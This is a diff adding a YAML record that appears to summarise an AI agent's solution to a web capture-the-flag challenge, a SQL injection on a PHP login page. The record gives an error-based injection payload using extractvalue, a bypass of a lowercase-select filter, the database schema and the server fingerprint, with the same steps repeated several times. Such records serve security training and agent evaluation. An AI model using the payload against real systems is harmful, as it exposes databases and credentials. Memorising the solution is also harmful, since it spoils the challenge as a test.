@@ -1,0 +1,111 @@
+name: SQL注入-2 a379bcfbef9a
+category: web
+keywords:
+- sql
+- login
+- php
+- user
+- ctfer
+- book
+- nu1l
+steps:
+- 'POST /login.php?tips=1 parameter name is SQL-injectable: "admin inversion comment"
+  returns wrong-password, "admin" plus false predicate returns absent account, and
+  lowercase select is filtered while uppercase SELECT executes.'
+- 'Error-based SQLi primitive: name=alice\047 and extractvalue(1,concat(0x7e,PAYLOAD))#
+  with tips=1 returns the expression result in XPATH syntax error; DB is note with
+  fl4g(flag) and users(id,username,passwd).'
+- Recovered <FLAG> from note.fl4g via SELECT flag, length=26, confirmed by two substring
+  reads; evidence in shared/sqli2-poc.md.
+- '[codex] Lowercase `select` is filtered, but uppercase `SELECT` executes.'
+- '[codex] The app database is `note`, containing `fl4g(flag)` and `users(id,username,passwd)`.'
+- '[codex] `extractvalue()` returned the complete flag; its length independently read
+  as 26 characters.'
+- '[codex] PoC and evidence saved to [sqli2-poc.md](/home/kali/workspace/shared/sqli2-poc.md).'
+- '[codex] FOUND_FLAG=<FLAG>'
+- Native Worker completed a bounded evidence-backed observation
+- Live target fingerprint is Apache/2.4.7 Ubuntu behind OpenResty with X-Powered-By
+  PHP/5.5.9-1ubuntu4.29; GET / is 403, GET /login.php is 200, and GET /user.php is
+  session-gated with body 'login first'.
+- The login UI's /js/index.js posts JSON fields name and pass to the same /login.php
+  URL and redirects to user.php when the JSON response has error=0; index.php, register.php,
+  and robots.txt return 404.
+- '[codex] Target runs Apache/2.4.7 on Ubuntu behind OpenResty with `X-Powered-By:
+  PHP/5.5.9-1ubuntu4.29`; `/` returns 403, `/login.php` returns 200, and `/user.php`
+  is session-gated with `login first`.'
+evidence_chain:
+- 'POST /login.php?tips=1 parameter name is SQL-injectable: "admin inversion comment"
+  returns wrong-password, "admin" plus false predicate returns absent account, and
+  lowercase select is filtered while uppercase SELECT executes.'
+- 'Error-based SQLi primitive: name=alice\047 and extractvalue(1,concat(0x7e,PAYLOAD))#
+  with tips=1 returns the expression result in XPATH syntax error; DB is note with
+  fl4g(flag) and users(id,username,passwd).'
+- Recovered <FLAG> from note.fl4g via SELECT flag, length=26, confirmed by two substring
+  reads; evidence in shared/sqli2-poc.md.
+- '[codex] Lowercase `select` is filtered, but uppercase `SELECT` executes.'
+- '[codex] The app database is `note`, containing `fl4g(flag)` and `users(id,username,passwd)`.'
+- '[codex] `extractvalue()` returned the complete flag; its length independently read
+  as 26 characters.'
+- Live target fingerprint is Apache/2.4.7 Ubuntu behind OpenResty with X-Powered-By
+  PHP/5.5.9-1ubuntu4.29; GET / is 403, GET /login.php is 200, and GET /user.php is
+  session-gated with body 'login first'.
+- The login UI's /js/index.js posts JSON fields name and pass to the same /login.php
+  URL and redirects to user.php when the JSON response has error=0; index.php, register.php,
+  and robots.txt return 404.
+- '[codex] Target runs Apache/2.4.7 on Ubuntu behind OpenResty with `X-Powered-By:
+  PHP/5.5.9-1ubuntu4.29`; `/` returns 403, `/login.php` returns 200, and `/user.php`
+  is session-gated with `login first`.'
+- '[codex] Replaying the existing `POST /login.php?tips=1` error-based SQLi payload
+  returned the flag verbatim in an XPath error; raw response saved at [classification-sqli-replay.raw](/home/kali/workspace/share'
+success_format: CTF2\{[^}]+\}
+source: a379bcfb-ef9a-4fe7-b5c6-8d8726c2cc69 (solver 4e698d89-436e-4c63-b361-0eeb5fe0d3a2)
+notes: ''
+flag_evidence_chains:
+  'flag #1':
+  - 'POST /login.php?tips=1 parameter name is SQL-injectable: "admin inversion comment"
+    returns wrong-password, "admin" plus false predicate returns absent account, and
+    lowercase select is filtered while uppercase SELECT executes.'
+  - 'Error-based SQLi primitive: name=alice\047 and extractvalue(1,concat(0x7e,PAYLOAD))#
+    with tips=1 returns the expression result in XPATH syntax error; DB is note with
+    fl4g(flag) and users(id,username,passwd).'
+  - Recovered <FLAG> from note.fl4g via SELECT flag, length=26, confirmed by two substring
+    reads; evidence in shared/sqli2-poc.md.
+  - '[codex] Lowercase `select` is filtered, but uppercase `SELECT` executes.'
+  - '[codex] The app database is `note`, containing `fl4g(flag)` and `users(id,username,passwd)`.'
+  - '[codex] `extractvalue()` returned the complete flag; its length independently
+    read as 26 characters.'
+  - Live target fingerprint is Apache/2.4.7 Ubuntu behind OpenResty with X-Powered-By
+    PHP/5.5.9-1ubuntu4.29; GET / is 403, GET /login.php is 200, and GET /user.php
+    is session-gated with body 'login first'.
+  - The login UI's /js/index.js posts JSON fields name and pass to the same /login.php
+    URL and redirects to user.php when the JSON response has error=0; index.php, register.php,
+    and robots.txt return 404.
+  - '[codex] Target runs Apache/2.4.7 on Ubuntu behind OpenResty with `X-Powered-By:
+    PHP/5.5.9-1ubuntu4.29`; `/` returns 403, `/login.php` returns 200, and `/user.php`
+    is session-gated with `login first`.'
+  - '[codex] Replaying the existing `POST /login.php?tips=1` error-based SQLi payload
+    returned the flag verbatim in an XPath error; raw response saved at [classification-sqli-replay.raw](/home/kali/workspace/share'
+  'flag #2':
+  - 'POST /login.php?tips=1 parameter name is SQL-injectable: "admin inversion comment"
+    returns wrong-password, "admin" plus false predicate returns absent account, and
+    lowercase select is filtered while uppercase SELECT executes.'
+  - 'Error-based SQLi primitive: name=alice\047 and extractvalue(1,concat(0x7e,PAYLOAD))#
+    with tips=1 returns the expression result in XPATH syntax error; DB is note with
+    fl4g(flag) and users(id,username,passwd).'
+  - Recovered <FLAG> from note.fl4g via SELECT flag, length=26, confirmed by two substring
+    reads; evidence in shared/sqli2-poc.md.
+  - '[codex] Lowercase `select` is filtered, but uppercase `SELECT` executes.'
+  - '[codex] The app database is `note`, containing `fl4g(flag)` and `users(id,username,passwd)`.'
+  - '[codex] `extractvalue()` returned the complete flag; its length independently
+    read as 26 characters.'
+  - Live target fingerprint is Apache/2.4.7 Ubuntu behind OpenResty with X-Powered-By
+    PHP/5.5.9-1ubuntu4.29; GET / is 403, GET /login.php is 200, and GET /user.php
+    is session-gated with body 'login first'.
+  - The login UI's /js/index.js posts JSON fields name and pass to the same /login.php
+    URL and redirects to user.php when the JSON response has error=0; index.php, register.php,
+    and robots.txt return 404.
+  - '[codex] Target runs Apache/2.4.7 on Ubuntu behind OpenResty with `X-Powered-By:
+    PHP/5.5.9-1ubuntu4.29`; `/` returns 403, `/login.php` returns 200, and `/user.php`
+    is session-gated with `login first`.'
+  - '[codex] Replaying the existing `POST /login.php?tips=1` error-based SQLi payload
+    returned the flag verbatim in an XPath error; raw response saved at [classification-sqli-replay.raw](/home/kali/workspace/share'
